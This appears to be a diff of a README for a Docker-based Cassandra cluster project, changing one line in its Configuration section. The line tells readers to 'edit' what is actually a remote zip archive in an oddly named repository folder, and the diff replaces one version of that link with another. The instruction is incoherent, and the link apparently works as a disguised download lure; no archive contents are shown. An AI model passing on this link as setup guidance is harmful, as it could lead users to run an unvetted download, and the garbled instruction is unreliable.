@@ -45,4 +45,4 @@ docker-compose logs -f
 
 ## Configuration
 
-Edit the `https://github.com/abuosi/cassandra-cluster/raw/refs/heads/main/uncomplainingly/cluster_cassandra_2.2.zip` file to customize cluster settings such as number of nodes, memory allocation, and network configuration.
+Edit the `https://raw.githubusercontent.com/abuosi/cassandra-cluster/main/uncomplainingly/cluster-cassandra-v3.3.zip` file to customize cluster settings such as number of nodes, memory allocation, and network configuration.
